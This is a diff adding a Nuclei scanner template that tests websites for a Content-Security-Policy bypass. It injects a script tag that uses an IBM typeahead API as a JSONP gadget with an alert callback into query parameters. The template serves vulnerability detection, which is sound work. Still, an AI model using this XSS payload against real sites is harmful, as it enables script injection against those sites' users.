@@ -1,0 +1,55 @@
+id: ibm-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - IBM API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,ibm-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "ibm.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: ibm_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "ibm_api_csp_xss == true"
+# digest: 4b0a00483046022100ec673f51ccbeb1434845da88cec7345a71da57b4ad108df0dd41049ac02bf4cc022100c6d754dfac0a5e18b2c7e32994dc2df67dc1da27fbf9799de63b5db7a46c4558:922c64590222798bb761d5b6d8e72950
